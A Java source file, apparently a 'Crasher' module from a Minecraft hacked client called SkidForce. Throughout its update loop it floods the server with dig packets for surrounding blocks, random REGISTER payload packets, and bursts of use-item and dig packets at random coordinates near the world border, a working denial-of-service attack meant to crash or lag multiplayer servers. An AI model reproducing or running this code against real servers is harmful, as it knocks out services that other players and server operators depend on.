package ru.fals3r.functions.impl.world;

import io.netty.buffer.Unpooled;
import io.netty.util.internal.ThreadLocalRandom;
import net.minecraft.client.multiplayer.WorldClient;
import net.minecraft.init.Blocks;
import net.minecraft.network.PacketBuffer;
import net.minecraft.network.play.client.CPacketCustomPayload;
import net.minecraft.network.play.client.CPacketPlayerDigging;
import net.minecraft.network.play.client.CPacketPlayerTryUseItemOnBlock;
import net.minecraft.util.EnumFacing;
import net.minecraft.util.EnumHand;
import net.minecraft.util.math.BlockPos;
import ru.fals3r.SkidForce;
import ru.fals3r.functions.Category;
import ru.fals3r.functions.Function;

public class Crasher extends Function
{
    public WorldClient lastWorld;
    public int tick;

    public Crasher()
    {
        this.registerName("Crasher");
        this.registerCategory(Category.World);
        SkidForce.settingsManager.addInt("Range", "CrasherRange", 1, 20, 5, this);
        SkidForce.settingsManager.addInt("I", "CrasherI", 1, 3, 1, this);
    }

    public void onUpdate()
    {
        if (this.mc.world == null || this.mc.player == null)
        {
            this.toggle(false);
        }

        ++this.tick;
        double d0 = SkidForce.settingsManager.getSettingByName("CrasherRange").getValDouble();

        for (double d1 = -d0; d1 < d0; ++d1)
        {
            for (double d2 = -d0; d2 < d0; ++d2)
            {
                for (double d3 = -d0; d3 < d0; ++d3)
                {
                    BlockPos blockpos1 = (new BlockPos(this.mc.player.posX, this.mc.player.posY, this.mc.player.posZ)).add(d1, d2, d3);

                    if (this.mc.world.getBlockState(blockpos1).getBlock() != Blocks.AIR && this.tick > -1)
                    {
                        this.mc.player.connection.sendPacket(new CPacketPlayerDigging(CPacketPlayerDigging.Action.START_DESTROY_BLOCK, blockpos1, EnumFacing.DOWN));
                        this.mc.player.connection.sendPacket(new CPacketPlayerDigging(CPacketPlayerDigging.Action.STOP_DESTROY_BLOCK, blockpos1, EnumFacing.DOWN));
                        this.mc.player.connection.sendPacket(new CPacketPlayerDigging(CPacketPlayerDigging.Action.START_DESTROY_BLOCK, blockpos1, EnumFacing.DOWN));
                        this.mc.player.swingArm(EnumHand.MAIN_HAND);
                    }
                }
            }
        }

        switch ((int)SkidForce.settingsManager.getSettingByName("CrasherI").getValDouble())
        {
            case 1:
                PacketBuffer packetbuffer = new PacketBuffer(Unpooled.buffer());
                packetbuffer.writeString(Double.toString(Math.random()));
                this.mc.player.connection.sendPacket(new CPacketCustomPayload("REGISTER", packetbuffer));
                break;

            case 2:
                for (int i = 0; i < 50; ++i)
                {
                    int l = (int)((ThreadLocalRandom.current().nextFloat() - 0.5F) * 5.99998E7F);
                    int j = ThreadLocalRandom.current().nextInt(256);
                    int k1 = (int)((ThreadLocalRandom.current().nextFloat() - 0.5F) * 5.99998E7F);
                    BlockPos blockpos = new BlockPos(l, j, k1);
                    this.mc.player.connection.sendPacket(new CPacketPlayerTryUseItemOnBlock(blockpos, EnumFacing.DOWN, EnumHand.MAIN_HAND, ThreadLocalRandom.current().nextFloat() * 0.5F + 0.5F, 1.0F, ThreadLocalRandom.current().nextFloat() * 0.5F + 0.5F));
                }

            case 3:
                for (int k = 0; k < 50; ++k)
                {
                    int i1 = (int)((ThreadLocalRandom.current().nextFloat() - 0.5F) * 5.99998E7F);
                    int j1 = ThreadLocalRandom.current().nextInt(256);
                    int l1 = (int)((ThreadLocalRandom.current().nextFloat() - 0.5F) * 5.99998E7F);
                    BlockPos blockpos2 = new BlockPos(i1, j1, l1);
                    this.mc.player.connection.getNetworkManager().sendPacket(new CPacketPlayerDigging(CPacketPlayerDigging.Action.START_DESTROY_BLOCK, blockpos2, EnumFacing.DOWN));
                    this.mc.player.connection.getNetworkManager().sendPacket(new CPacketPlayerDigging(CPacketPlayerDigging.Action.STOP_DESTROY_BLOCK, blockpos2, EnumFacing.DOWN));
                }
        }
    }
}
